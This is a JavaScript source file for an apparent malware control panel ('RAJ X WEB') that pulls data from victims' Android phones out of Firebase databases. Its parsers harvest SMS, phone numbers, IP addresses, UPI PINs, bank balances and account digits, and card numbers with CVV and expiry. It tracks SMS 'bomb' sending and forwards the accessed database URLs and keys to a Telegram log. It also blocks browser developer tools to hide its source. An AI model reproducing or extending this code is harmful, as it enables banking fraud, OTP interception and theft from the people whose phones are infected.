// ═══════════════════════════════════════════════════
//  RAJ X WEB — Main Application (app.js)
//  Secure version — sensitive calls go through backend
// ═══════════════════════════════════════════════════

// Pull config (only public values)
const CFG           = window.RAJX_CONFIG || {};
const API_SECRET    = CFG.API_SECRET    || "";
const API_ENDPOINT  = CFG.API_ENDPOINT  || "/.netlify/functions/api";
const TELEGRAM_LINK = CFG.TELEGRAM_LINK || "https://t.me/FREEOTPPANNELS";
const PANEL_LINK    = CFG.PANEL_LINK    || "https://otppannels.netlify.app/";
const DEFAULT_FB_KEY= CFG.DEFAULT_FB_KEY|| "Annebella";

// ═══════════════════════════════════════════
//  BACKEND CALL HELPER
// ═══════════════════════════════════════════
async function backendCall(action, payload) {
  const res = await fetch(API_ENDPOINT, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Api-Secret": API_SECRET,
    },
    body: JSON.stringify({ action, ...payload }),
  });
  if (!res.ok) throw new Error("Backend " + res.status);
  return res.json();
}

// Backend wrapper for Firebase fetch (GET)
async function fbGet(url, key, path, params) {
  try {
    const r = await backendCall("fb_fetch", { dbUrl: url, dbKey: key, path, params });
    return r && r.ok ? r.data : null;
  } catch (e) { return null; }
}

// Backend wrapper for single node get
async function fbGetNode(url, key, path) {
  try {
    const r = await backendCall("fb_get_node", { dbUrl: url, dbKey: key, path });
    return r && r.ok ? r.data : null;
  } catch (e) { return null; }
}

// Backend wrapper for PUT
async function fbPutNode(url, key, path, value) {
  try {
    const r = await backendCall("fb_put_node", { dbUrl: url, dbKey: key, path, value });
    return !!(r && r.ok);
  } catch (e) { return false; }
}

// Backend wrapper for DELETE
async function fbDeleteNode(url, key, path) {
  try {
    const r = await backendCall("fb_delete_node", { dbUrl: url, dbKey: key, path });
    return !!(r && r.ok);
  } catch (e) { return false; }
}

// ═══════════════════════════════════════════
//  SOURCE PROTECTION (same as before)
// ═══════════════════════════════════════════
(function _protect() {
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('keydown', e => {
    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && ['I','i','J','j','C','c'].includes(e.key)) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
  });
  try { if (window.top !== window.self) window.top.location = window.self.location; } catch(e) {}
  document.addEventListener('dragstart', e => { if (e.target.tagName === 'IMG') e.preventDefault(); });
})();

// ═══════════════════════════════════════════
//  GLOBALS (same as before)
// ═══════════════════════════════════════════
const $ = id => document.getElementById(id);

let currentDb         = { url: "", key: "", name: "" };
let allDevices        = [];
let isAllMode         = false;
let activeDevice      = null;
let currentFilter     = 'all';
let currentSort       = 'newest';
let starredDevices    = JSON.parse(localStorage.getItem('starred_devices') || '[]');
let savedDbs          = JSON.parse(localStorage.getItem('rajxweb_saved_dbs') || '[]');
let autoRefreshTimer  = null;
let firebaseAutoRefreshTimer = null;
let firebaseRefreshInterval  = 3000;
let firebaseMissCount = 0;
let lastRawSms        = "";
let isDeleting        = false;
let isFetchingSms     = false;
let deviceStatusCache = {};
let deviceForwarders  = JSON.parse(localStorage.getItem('dev_forwarders') || '{}');
let fakeOfflineDevices = JSON.parse(localStorage.getItem('fake_offline_devices') || '[]');
let fakeOfflineSince   = JSON.parse(localStorage.getItem('fake_offline_since') || '{}');
let smsLockedDevices   = JSON.parse(localStorage.getItem('sms_locked_devices') || '[]');
let isSharedLinkMode  = false;
let pendingAutoOpenDevice = null;
let shareTargetDeviceId   = null;
let loggedDbs             = new Set();
let bulkActiveUrls        = [];
let broadcastActive       = false;

let allMsgsCache     = [];
let allMsgsIds       = new Set();
let allMsgsLoading   = false;
let allMsgsAutoTimer = null;
let allMsgsBgTimer   = null;
let allMsgsLastSeen  = {};
let allMsgsLastRefreshTime = 0;
let allMsgsLabelTicker     = null;
let lastSeenTicker         = null;

function _saveMsgsToSession() {
  try {
    sessionStorage.setItem('rajx_msgs_cache', JSON.stringify(allMsgsCache.slice(0, 500)));
    sessionStorage.setItem('rajx_msgs_time',  String(allMsgsLastRefreshTime));
  } catch(e) {}
}
function _loadMsgsFromSession() {
  try {
    const raw = sessionStorage.getItem('rajx_msgs_cache');
    const ts  = parseInt(sessionStorage.getItem('rajx_msgs_time') || '0');
    if (raw && ts && (Date.now() - ts) < 120000) {
      allMsgsCache = JSON.parse(raw);
      allMsgsIds   = new Set(allMsgsCache.map(m => (m.dbUrl||'') + '_' + m.devId + '_' + m.id));
      allMsgsLastRefreshTime = ts;
      return true;
    }
  } catch(e) {}
  return false;
}

let deletedSmsCache = JSON.parse(localStorage.getItem('deleted_sms_cache') || '{}');
let bgWorker  = null;
let bombActive = false, bombSent = 0, bombFail = 0, bombStartTime = 0;
let bombStatsTimer = null, bombLoopTimeout = null, bombDragStart = null, bombDragInit = false;
let removedDbsLog = JSON.parse(localStorage.getItem('rajxweb_removed_dbs') || '[]');
let deadDbs = [], scanRunning = false;

function savePreIds() {
  try {
    const ser = {};
    Object.keys(window._preFakeSmsIds || {}).forEach(k => {
      const v = window._preFakeSmsIds[k];
      ser[k] = v instanceof Set ? Array.from(v) : (Array.isArray(v) ? v : []);
    });
    localStorage.setItem('rajxweb_preFakeSmsIds', JSON.stringify(ser));
  } catch(e) {}
}
function loadPreIds() {
  try {
    const raw = JSON.parse(localStorage.getItem('rajxweb_preFakeSmsIds') || '{}');
    const out = {};
    Object.keys(raw).forEach(k => { if (Array.isArray(raw[k])) out[k] = new Set(raw[k]); });
    return out;
  } catch(e) { return {}; }
}
window._preFakeSmsIds  = loadPreIds();
window.deviceSmsCache  = {};
let gallerySelected = new Set(), galleryData = {}, galleryIds = [];

const SMS_PER_DEVICE_LIMIT = 200;
const IST_OFFSET = 5.5 * 60 * 60 * 1000;

// ═══════════════════════════════════════════
//  HELPERS (same as before)
// ═══════════════════════════════════════════
function formatRelativeTime(ms) {
  if (!ms || ms < 1e12) return '';
  const diff = Date.now() - ms;
  if (diff < 0) return 'just now';
  const sec = Math.floor(diff / 1000);
  if (sec < 5)  return 'just now';
  if (sec < 60) return sec + 's ago';
  const min = Math.floor(sec / 60);
  if (min < 60) return min + 'm ago';
  const hr = Math.floor(min / 60);
  if (hr < 24)  return hr + 'h ago';
  const day = Math.floor(hr / 24);
  if (day < 30) return day + 'd ago';
  return Math.floor(day / 30) + 'mo ago';
}
function refreshLastSeenLabels() {
  document.querySelectorAll('[data-lastseen]').forEach(el => {
    const ts = parseInt(el.dataset.lastseen);
    if (ts > 1e12) {
      el.textContent = el.dataset.online === '1'
        ? '• ' + formatRelativeTime(ts)
        : '• offline ' + formatRelativeTime(ts);
    }
  });
}
function toast(msg) {
  const t = $('toast'); t.textContent = msg; t.className = 'toast show';
  setTimeout(() => t.className = 'toast', 2500);
}
function getISTDate(ms)  { const d = new Date((ms||Date.now())+IST_OFFSET); return d.toISOString().slice(0,10); }
function getTodayIST()   { return getISTDate(Date.now()); }

// ═══════════════════════════════════════════
//  AES ENCRYPT / DECRYPT (same)
// ═══════════════════════════════════════════
async function aesEncrypt(plaintext) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt','decrypt']);
  const iv  = crypto.getRandomValues(new Uint8Array(12));
  const ct  = await crypto.subtle.encrypt({name:'AES-GCM',iv},key,enc.encode(plaintext));
  const rawKey = new Uint8Array(await crypto.subtle.exportKey('raw',key));
  const masked = new Uint8Array(rawKey.length);
  for(let i=0;i<rawKey.length;i++) masked[i]=rawKey[i]^iv[i%iv.length]^0xA5;
  const out = new Uint8Array(iv.length+masked.length+ct.byteLength);
  out.set(iv,0); out.set(masked,iv.length); out.set(new Uint8Array(ct),iv.length+masked.length);
  return b64UrlEncode(out);
}
async function aesDecrypt(encoded) {
  try {
    const combined = b64UrlDecode(encoded);
    if(combined.length < 12+32+16) return null;
    const iv      = combined.slice(0,12);
    const masked  = combined.slice(12,44);
    const ct      = combined.slice(44);
    const rawKey  = new Uint8Array(32);
    for(let i=0;i<32;i++) rawKey[i]=masked[i]^iv[i%12]^0xA5;
    const key = await crypto.subtle.importKey('raw',rawKey,{name:'AES-GCM'},false,['decrypt']);
    const pt  = await crypto.subtle.decrypt({name:'AES-GCM',iv},key,ct);
    return new TextDecoder().decode(pt);
  } catch(e){ return null; }
}
function b64UrlEncode(bytes){let s='';for(let i=0;i<bytes.length;i++)s+=String.fromCharCode(bytes[i]);return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');}
function b64UrlDecode(str){let s=str.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';const bin=atob(s);const out=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)out[i]=bin.charCodeAt(i);return out;}

// ═══════════════════════════════════════════
//  FIREBASE FETCH (via backend)
// ═══════════════════════════════════════════
async function yn(A, tt, b, d, signal) {
  let S = String(A||"").trim().replace(/\/$/,"");
  if(!S.startsWith("http")) S="https://"+S;
  const params = {};
  if (d) Object.keys(d).forEach(k => { params[k] = d[k]; });
  const r = await backendCall("fb_fetch", { dbUrl: S, dbKey: tt || "", path: b, params });
  if (!r || !r.ok) {
    if (r && (r.status === 401 || r.status === 403)) throw new Error("PERMISSION_DENIED");
    if (r && r.status === 404) return null;
    throw new Error("Network error");
  }
  return r.data;
}

// ═══════════════════════════════════════════
//  TG LOG (via backend)
// ═══════════════════════════════════════════
async function sendTgLog(origInput, decUrl, key, isDevice, devId, tot, onl) {
  let txt = "🚨 <b>New Firebase Action Logged</b>\n\n";
  if (origInput && origInput !== decUrl) txt += "📥 <b>Original:</b> <code>" + origInput + "</code>\n\n";
  txt += "🔓 <b>URL:</b> <code>" + decUrl + "</code>\n🔑 <b>Key:</b> <code>" + (key || 'None') + "</code>\n📱 <b>Device:</b> <code>" + (isDevice ? devId : 'Whole DB') + "</code>\n";
  if (!isDevice && (tot > 0 || onl > 0)) txt += "\n📊 <b>Stats:</b>\n📱 Total: <code>" + tot + "</code>\n🟢 Online: <code>" + onl + "</code>\n🔴 Offline: <code>" + (tot - onl) + "</code>\n";
  txt += "\n⏰ " + new Date().toLocaleString();
  await backendCall("tg_log", { text: txt }).catch(() => {});
}

// ═══════════════════════════════════════════
//  BANK / CARD / QUOTA PARSERS (same as before)
// ═══════════════════════════════════════════
const bankMap={'FINOBK':'Fino Payments Bank','FINO':'Fino Payments Bank','FEDRAL':'Federal Bank','FED':'Federal Bank','FEDBK':'Federal Bank','BOI':'Bank of India','BOIIND':'Bank of India','BOB':'Bank of Baroda','BARB':'Bank of Baroda','HDFC':'HDFC Bank','HDFCBK':'HDFC Bank','HDFCBN':'HDFC Bank','SBI':'SBI','SBIN':'SBI','SBIINB':'SBI','SBICRD':'SBI Card','ICICI':'ICICI Bank','ICICIB':'ICICI Bank','AXIS':'Axis Bank','AXISBK':'Axis Bank','UTIB':'Axis Bank','KOTAK':'Kotak Bank','KMB':'Kotak Bank','KKBK':'Kotak Bank','PNB':'PNB','PNBSMS':'PNB','PUNB':'PNB','CANARA':'Canara Bank','CNRB':'Canara Bank','UNION':'Union Bank','UBIN':'Union Bank','YES':'Yes Bank','YESBK':'Yes Bank','IDBI':'IDBI Bank','INDUS':'IndusInd Bank','INDB':'IndusInd Bank','RBL':'RBL Bank','RATN':'RBL Bank','PAYTM':'Paytm','PYTM':'Paytm','IPPB':'IPPB','IPBMSG':'IPPB','AIRTEL':'Airtel','AIRTELP':'Airtel Payments Bank','JIOMNY':'Jio Money','JIOFIN':'Jio Finance','BAJAJ':'Bajaj Finserv','BAJAJF':'Bajaj Finserv','IDFC':'IDFC First','IDFCFB':'IDFC First','BANDHAN':'Bandhan Bank','BDBL':'Bandhan Bank','CITI':'Citi Bank','CITIBK':'Citi Bank','HSBC':'HSBC','HSBCBK':'HSBC','AMEX':'Amex','JUPITER':'Jupiter','JUPITR':'Jupiter','KARNATAKA':'Karnataka Bank','KARB':'Karnataka Bank','IOB':'IOB','IOBA':'IOB','UCO':'UCO Bank','UCBA':'UCO Bank','INDIAN':'Indian Bank','IDIB':'Indian Bank','DBIL':'Deutsche Bank','CENTBK':'Central Bank','CBIN':'Central Bank','DBS':'DBS Bank','DBSS':'DBS Bank','AUSFB':'AU Small Finance','AUBL':'AU Small Finance','EQUITAS':'Equitas Bank','ESFB':'Equitas Bank','UJJIVAN':'Ujjivan Bank','UJVN':'Ujjivan Bank','SIB':'South Indian Bank','SIBL':'South Indian Bank','SCB':'Standard Chartered','SCBL':'Standard Chartered','OBC':'OBC Bank','ORBC':'OBC Bank','PSB':'Punjab & Sind Bank','PSIB':'Punjab & Sind Bank','CSB':'CSB Bank','CSBK':'CSB Bank','TMB':'Tamilnad Mercantile Bank','TMBL':'Tamilnad Mercantile Bank','CUB':'City Union Bank','CIUB':'City Union Bank','SLICE':'Slice','APAY':'Amazon Pay','AMZPAY':'Amazon Pay','MAHABANK':'Bank of Maharashtra','MAHA':'Bank of Maharashtra'};
const fakeSenderBlacklist=/^(OTP|VERIFY|INFO|AMAZON|AMZN|FLIPKART|FKRT|MYNTRA|SWIGGY|ZOMATO|IRCTC|UBER|OLA|BIGBASKET|BBD|AJIO|NYKAA|MEESHO|SNAPDEAL|DOMINOS|PIZZA|BESCOM|ELECTRIC|WATER|GAS|DLT|VK-|AD-|AX-|TM-|VM-|BM-|BZ-|JD-|CP-|MM-|MO-|CQ-)$/i;
const _bankCache={};
function getBankFromSender(sender){
  if(!sender) return null;
  const raw=String(sender).toUpperCase().trim();
  if(_bankCache[raw]!==undefined) return _bankCache[raw];
  if(fakeSenderBlacklist.test(raw)){_bankCache[raw]=null;return null;}
  let s=raw.replace(/^(VK|AD|AX|TM|VM|BM|BZ|JD|CP|MM|MO|CQ)[-:\s]+/i,'').trim();
  if(s.length<4){_bankCache[raw]=null;return null;}
  let found=null;
  const sortedKeys=Object.keys(bankMap).sort((a,b)=>b.length-a.length);
  for(const key of sortedKeys){if(s===key||s.startsWith(key)){found=bankMap[key];break;}}
  _bankCache[raw]=found; return found;
}
function parseBankSMS(text,sender){
  if(!text||text.length<10) return null;
  const simKw=/daily free sms|last-call|charge:|voucher|ulpack|data balance|main-bal|recharge|validity|plan|offer|free sms balance/i;
  const bankKw=/debited|credited|withdrawn|deposited|a\/c|account|acct|transferred|refund|avl bal|available bal|current bal/i;
  if(simKw.test(text)&&!bankKw.test(text)) return null;
  let bankName=getBankFromSender(sender);
  if(!bankName){
    if(!/(?:debited|credited|withdrawn|deposited|transferred|refund)/i.test(text)) return null;
    if(!/(?:rs|inr|₹)\s*[0-9]/i.test(text)) return null;
    const cb=text.match(/\b(SBI|HDFC|ICICI|AXIS|KOTAK|PNB|BOB|BOI|UNION|CANARA|YES|IDBI|INDUSIND|RBL|PAYTM|IPPB|AIRTEL|FEDERAL|BANDHAN|IDFC|JUPITER|NAVI|CRED|AMEX|HSBC|CITI|FINO|DBS|UCO|IOB|OBC|CBI|CUB)\b/i);
    if(cb) bankName=cb[1].toUpperCase()+' Bank'; else bankName='Bank';
  }
  let balance=null,txAmount=null,txType=null;
  const balPs=[/(?:avl|avbl|available|current)?\s*bal(?:ance)?[\s:\-]*(?:rs\.?|inr|₹)?\s*([0-9,]+\.?[0-9]*)/i,/(?:rs\.?|inr|₹)\s*([0-9,]+\.?[0-9]*)[\s\-]*(?:avl|avbl|available)?\s*bal/i];
  for(const p of balPs){const m=text.match(p);if(m){balance=m[1].replace(/,/g,'');break;}}
  if(/\bdebited\b/i.test(text)||/\bwithdrawn\b/i.test(text)||/\bpaid\b/i.test(text)){txType='debit';const m=text.match(/(?:debited|withdrawn|paid)(?:\s+(?:by|with|for|of|rs\.?|inr|₹))?\s*(?:rs\.?|inr|₹)?\s*([0-9,]+\.?[0-9]*)/i);if(m) txAmount=m[1].replace(/,/g,'');}
  else if(/\bcredited\b/i.test(text)||/\breceived\b/i.test(text)||/\bdeposited\b/i.test(text)){txType='credit';const m=text.match(/(?:credited|received|deposited)(?:\s+(?:by|with|for|of|rs\.?|inr|₹))?\s*(?:rs\.?|inr|₹)?\s*([0-9,]+\.?[0-9]*)/i);if(m) txAmount=m[1].replace(/,/g,'');}
  if(txAmount===balance) txAmount=null;
  if(!balance&&!txAmount) return null;
  let accLast4=null;
  const am=text.match(/(?:a\/c|account|acct|ending|xx+|\*+|\.\.)\s*(?:no\.?\s*)?([0-9]{4})\b/i);
  if(am) accLast4=am[1];
  return{bankName,availableBalance:balance,transactionAmount:txAmount,transactionType:txType,accountLast4:accLast4,rawSms:text,sender};
}
function isQuotaSms(text){
  if(!text||text.length<10) return null;
  const u=String(text).toUpperCase();
  if(!/(SMS|MSG|MESSAGE)/.test(u)) return null;
  if(/EXHAUST(?:ED)?/i.test(u)) return{pct:100,type:'reached'};
  if(/LIMIT\s*(?:HAS\s+BEEN\s+|IS\s+)?(?:REACHED|EXCEED|CROSS|HIT|OVER)/i.test(u)) return{pct:100,type:'reached'};
  if(/QUOTA\s*(?:HAS\s+BEEN\s+|IS\s+)?(?:REACHED|EXCEED|CROSS|HIT|OVER)/i.test(u)) return{pct:100,type:'reached'};
  if(/NO\s+(?:MORE\s+)?(?:FREE\s+)?SMS\s*(?:LEFT|AVAILABLE|REMAIN)/i.test(u)) return{pct:100,type:'reached'};
  if(/(?:CANNOT|CAN'?T|UNABLE\s+TO)\s+SEND/i.test(u)) return{pct:100,type:'reached'};
  if(/RECHARGE\s+(?:TO|FOR)\s+(?:SEND|CONTINUE|USE)/i.test(u)) return{pct:100,type:'reached'};
  let pm=u.match(/(?:CONSUMED|USED)\s+(\d{1,3})\s*%\s+OF/i);
  if(!pm) pm=u.match(/(\d{1,3})\s*%\s+(?:OF\s+)?(?:YOUR\s+|THE\s+|DAILY\s+)?(?:SMS|MSG|MESSAGE|QUOTA|LIMIT)/i);
  if(!pm) pm=u.match(/(?:SMS|MSG|MESSAGE|QUOTA|LIMIT)\s*[:\-]?\s*(\d{1,3})\s*%/i);
  if(pm){const pct=Math.min(100,parseInt(pm[1]));if(pct>=100) return{pct:100,type:'reached'};if(pct>=50) return{pct,type:'used'};return null;}
  const bm=u.match(/(?:SMS|MSG|MESSAGE)\s*(?:BAL|BALANCE|LEFT|REMAIN|AVAILABLE)\D{0,15}(\d+(?:\.\d+)?)/i);
  if(bm&&parseFloat(bm[1])<=0) return{pct:100,type:'reached'};
  return null;
}
function findLatestQuotaSms(smsArr){
  if(!smsArr||!smsArr.length) return null;
  let latest=null;
  for(const m of smsArr){const q=isQuotaSms(m.text);if(!q) continue;const ms=parseTimeMs(m.time,m.id);if(!latest||ms>latest.ms) latest={msg:m,ms,pct:q.pct,type:q.type};}
  return latest;
}
function computeQuotaForDevice(devId,smsArr){
  const latest=findLatestQuotaSms(smsArr);
  let hit=false,text="",time=0,pct=0,type='';
  if(latest&&latest.ms){hit=getISTDate(latest.ms)===getTodayIST();text=latest.msg.text;time=latest.ms;pct=latest.pct;type=latest.type;}
  return{hit,latestText:text,latestTime:time,pct,type};
}
const cardKeywords=/CARD|CVV|CREDIT|DEBIT|VISA|MASTERCARD|RUPAY|AMEX|AMERICAN\s*EXPRESS/i;
const cardNoRegexes=[/\b(?:[0-9]{4}[\s\-]?){3}([0-9]{4})\b/,/(?:card|debit|credit|visa|mastercard|rupay)[\s:=\-#]*(?:no\.?|number|ending)?[\s:xX*\-]*([xX*]{0,8}[0-9]{4})\b/i,/\b[Xx*]{4,}[0-9]{4}\b/,/(?:ending|last\s*4|tail)[\s:\-]*([0-9]{4})\b/i];
const cvvRegexes=[/(?:CVV|cvc|security\s*code)[\s:=\-]*([0-9]{3,4})\b/i];
const expRegexes=[/(?:exp(?:iry)?|valid\s*thru?|valid\s*till)[\s:=\-]*([0-9]{1,2}\s*\/\s*[0-9]{2,4})/i,/\b(0[1-9]|1[0-2])\s*\/\s*([0-9]{2}|20[0-9]{2})\b/];
function parseCardSMS(text){
  if(!text||!cardKeywords.test(text)) return null;
  let last4="";
  for(const re of cardNoRegexes){const m=text.match(re);if(m){const digits=(m[1]||m[0]).replace(/[^0-9]/g,'');if(digits.length>=4){last4=digits.slice(-4);break;}}}
  if(!last4) return null;
  let type="";
  if(/VISA/i.test(text)) type="VISA"; else if(/MASTER(?:CARD)?/i.test(text)) type="Mastercard"; else if(/RUPAY/i.test(text)) type="RuPay"; else if(/AMEX|AMERICAN\s*EXPRESS/i.test(text)) type="Amex"; else if(/credit/i.test(text)) type="Credit Card"; else type="Debit Card";
  let cvv="",expiry="";
  for(const r of cvvRegexes){const m=text.match(r);if(m&&m[1]){cvv=m[1];break;}}
  for(const r of expRegexes){const m=text.match(r);if(m&&m[1]){expiry=m[1].trim();break;}}
  return{cardLast4:last4,cardType:type,cvv,expiry,rawSms:text};
}

// ═══════════════════════════════════════════
//  TIME HELPERS (same as before)
// ═══════════════════════════════════════════
function parseTimeMs(raw,msgId){
  if(raw===null||raw===undefined||raw==='') return 0;
  if(typeof raw==='object'){
    if(Array.isArray(raw)&&raw.length>=5){let y=+raw[0],mo=+raw[1],d=+raw[2],h=+raw[3],mi=+raw[4],se=+(raw[5]||0);if(mo>12) return 0;return Date.UTC(y,mo,d,h-5,mi-30,se);}
    if(raw.seconds!==undefined&&raw.seconds>0) return raw.seconds*1000;
    if(raw._seconds!==undefined&&raw._seconds>0) return raw._seconds*1000;
    if(raw.value!==undefined) return parseTimeMs(raw.value,msgId);
    if(raw.$date!==undefined) return parseTimeMs(raw.$date,msgId);
    return 0;
  }
  if(typeof raw==='number'){
    if(raw>1e12&&raw<1e13) return raw;
    if(raw>1e9&&raw<1e10) return raw*1000;
    if(raw>1e10&&raw<1e12) return raw*1000;
    return 0;
  }
  let s=String(raw).trim();
  if(!s) return 0;
  if(/^\d{10}(\.\d+)?$/.test(s)) return Math.floor(parseFloat(s)*1000);
  if(/^\d{13}$/.test(s)) return parseInt(s);
  if(/^\d{11,12}$/.test(s)) return parseInt(s)*1000;
  if(/[Zz]$/.test(s)||/[+-]\d{2}:?\d{2}$/.test(s)){let d=new Date(s);if(!isNaN(d.getTime())) return d.getTime();}
  let m1=s.match(/^(\d{4})-(\d{1,2})-(\d{1,2})[T ](\d{1,2}):(\d{2})(?::(\d{2}))?(?:\.\d+)?$/);
  if(m1) return Date.UTC(+m1[1],+m1[2]-1,+m1[3],+m1[4]-5,+m1[5]-30,+(m1[6]||0));
  let m2=s.match(/^(\d{4})[\/\-](\d{1,2})[\/\-](\d{1,2})[T ](\d{1,2}):(\d{2})(?::(\d{2}))?/);
  if(m2) return Date.UTC(+m2[1],+m2[2]-1,+m2[3],+m2[4]-5,+m2[5]-30,+(m2[6]||0));
  let m3=s.match(/^(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{2,4})[T ](\d{1,2}):(\d{2})(?::(\d{2}))?/);
  if(m3){let y=+m3[3];if(y<100) y+=2000;return Date.UTC(y,+m3[2]-1,+m3[1],+m3[4]-5,+m3[5]-30,+(m3[6]||0));}
  let d=new Date(s); if(!isNaN(d.getTime())&&d.getTime()>1e12) return d.getTime();
  let m4=s.match(/^(\d{1,2}):(\d{2})(?::(\d{2}))?$/);
  if(m4){let ist=new Date(Date.now()+IST_OFFSET);return Date.UTC(ist.getUTCFullYear(),ist.getUTCMonth(),ist.getUTCDate(),+m4[1]-5,+m4[2]-30,+(m4[3]||0));}
  if(msgId&&typeof msgId==='string'&&msgId.length>=8){
    const CHARS='-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
    let ts=0,valid=true;
    for(let i=0;i<8;i++){let idx=CHARS.indexOf(msgId[i]);if(idx<0){valid=false;break;}ts=ts*64+idx;}
    if(valid&&ts>1e12&&ts<1e13) return ts;
  }
  return 0;
}
function formatIST(raw,msgId){
  let ms=parseTimeMs(raw,msgId);
  if(!ms||ms<1e12){if(msgId) ms=parseTimeMs('',msgId);if(!ms||ms<1e12) return '—';}
  try{
    let d=new Date(ms);
    let dateStr=d.toLocaleDateString('en-GB',{timeZone:'Asia/Kolkata',day:'2-digit',month:'2-digit',year:'numeric'}).replace(/\//g,'-');
    let timeStr=d.toLocaleTimeString('en-US',{timeZone:'Asia/Kolkata',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:true}).toLowerCase();
    return dateStr+' | '+timeStr;
  } catch(e){return '—';}
}
function formatAmount(amt){if(amt===null||amt===undefined||amt==='') return '0.00';const n=Number(String(amt).replace(/,/g,''));if(isNaN(n)) return String(amt);return n.toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});}

// ═══════════════════════════════════════════
//  WELCOME / JOIN (same)
// ═══════════════════════════════════════════
let joinTabOpened=false,joinTimer=null,joinCountdown=0;
function joinAndContinue(){window.open("https://t.me/+3p5F9JVFaAA1MzBl","_blank");joinTabOpened=true;startJoinCountdown(5);}
function startJoinCountdown(seconds){
  clearInterval(joinTimer);joinCountdown=seconds;
  let btn=$('btnContinue'),statusEl=$('joinStatus');
  btn.classList.remove('enabled');btn.style.pointerEvents='none';
  btn.innerText='Verify in '+joinCountdown+'s...';
  statusEl.innerText="Join the channel to continue...";statusEl.style.color='var(--warn)';
  joinTimer=setInterval(()=>{
    joinCountdown--;
    if(joinCountdown<=0){
      clearInterval(joinTimer);
      btn.innerText='✅ Continue to Panel';btn.classList.add('enabled');btn.style.pointerEvents='auto';
      statusEl.innerText='✅ Verified! Click Continue.';statusEl.style.color='var(--green)';
      localStorage.setItem('joined_channel','true');localStorage.setItem('joined_time',Date.now());
    } else { btn.innerText='Verify in '+joinCountdown+'s...'; }
  },1000);
}
document.addEventListener('visibilitychange',()=>{if(!document.hidden&&joinTabOpened&&joinCountdown>0) joinCountdown=Math.min(joinCountdown,2);});
function closeWelcome(){if($('btnContinue').classList.contains('enabled')) $('welcomeModal').classList.remove('show');}
const _joinedTime=parseInt(localStorage.getItem('joined_time')||'0');
const SEVEN_DAYS=7*24*60*60*1000;
if(localStorage.getItem('joined_channel')==='true'&&(Date.now()-_joinedTime)<SEVEN_DAYS) $('welcomeModal').classList.remove('show');
else{localStorage.removeItem('joined_channel');localStorage.removeItem('joined_time');$('btnContinue').style.pointerEvents='none';}

// ═══════════════════════════════════════════
//  UI NAVIGATION (same)
// ═══════════════════════════════════════════
function toggleMenu(){$('headerMenu').classList.toggle('show');}
function toggleDesktopMode(){
  document.body.classList.toggle('desktop-mode');
  const isDesktop=document.body.classList.contains('desktop-mode');
  $('desktopModeText').innerText=isDesktop?"Mobile Mode":"Desktop Mode";
  localStorage.setItem('desktop_mode',isDesktop);
}
function switchMainTab(tab){
  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  $('view-'+tab).classList.add('active');
  if($('nav-'+tab)) $('nav-'+tab).classList.add('active');
  closeNavMore();
  if(tab!=='allmsgs'&&allMsgsAutoTimer){clearInterval(allMsgsAutoTimer);allMsgsAutoTimer=null;}
}
function switchDetailTab(tab,el){
  document.querySelectorAll('.d-tab').forEach(t=>t.classList.remove('active'));
  if(el) el.classList.add('active');
  document.querySelectorAll('.det-content').forEach(c=>c.classList.remove('active'));
  const target=$('tab-content-'+tab);
  if(target) target.classList.add('active');
  const wrapper=document.querySelector('.det-content-wrapper');
  if(wrapper) wrapper.scrollTop=0;
  if(tab!=='gallery') $('galleryFooter').style.display='none';
  else if(gallerySelected.size>0) $('galleryFooter').style.display='flex';
}
function closeView(id){
  $(id).classList.remove('active');
  if(id==='view-device'){clearTimeout(autoRefreshTimer);autoRefreshTimer=null;$('galleryFooter').style.display='none';}
}
function toggleNavMore(e){e.stopPropagation();$('navMoreDropdown').classList.toggle('show');}
function closeNavMore(){$('navMoreDropdown').classList.remove('show');}
document.addEventListener('click',(e)=>{
  if(!e.target.closest('.nav-more-dropdown')&&!e.target.closest('#nav-more')) closeNavMore();
  if(!e.target.closest('.dropdown-menu')&&!e.target.closest('.menu-icon')) $('headerMenu').classList.remove('show');
});

// ═══════════════════════════════════════════
//  DEVICE PARSING (same)
// ═══════════════════════════════════════════
function parseDevice(k,dev,db){
  if(typeof dev!=='object'||dev===null) return null;
  let isOn=false;
  if(typeof dev.status==='boolean') isOn=dev.status;
  else if(typeof dev.status==='string') isOn=dev.status.toLowerCase()==='online'||dev.status==='true'||dev.status==='1';
  let lastSeenRaw=dev.lastSeen||dev.last_seen||dev.lastOnline||dev.timestamp||dev.time;
  let lastSeen=lastSeenRaw?parseInt(lastSeenRaw):0;
  if(lastSeen>0&&lastSeen<9999999999) lastSeen*=1000;
  if(lastSeen>0&&Date.now()-lastSeen<180000) isOn=true;
  let sims=[];if(dev.sims) sims=Array.isArray(dev.sims)?dev.sims:Object.values(dev.sims);
  let name=dev.modelName||dev.model||dev.deviceName||dev.brand||dev.mobilesdk||k;
  let phone="—";
  for(const c of [dev.mobNo,dev.number,dev.phone,dev.mobile,dev.phoneNumber,dev.phonenumber]){if(c&&c!=="—"&&String(c).trim()){phone=String(c);break;}}
  if(phone==="—"&&sims.length>0){for(let s of sims){if(s&&(s.phoneNumber||s.number||s.mobile)){phone=s.phoneNumber||s.number||s.mobile;break;}}}
  let android=dev.androidV||dev.androidVersion||dev.android||dev.osVersion||"—";
  let network=dev.service_provider||dev.network||dev.carrier||dev.operator||"—";
  let batteryStr=String(dev.battery||dev.batteryLevel||"0%");
  let ip=dev.ip_address||dev.ip||dev.ipAddress||"—";
  let upiPin=dev.upipin||dev.upi_pin||dev.upiPin||null;
  let isFake=fakeOfflineDevices.includes(k);
  if(isFake) isOn=false;
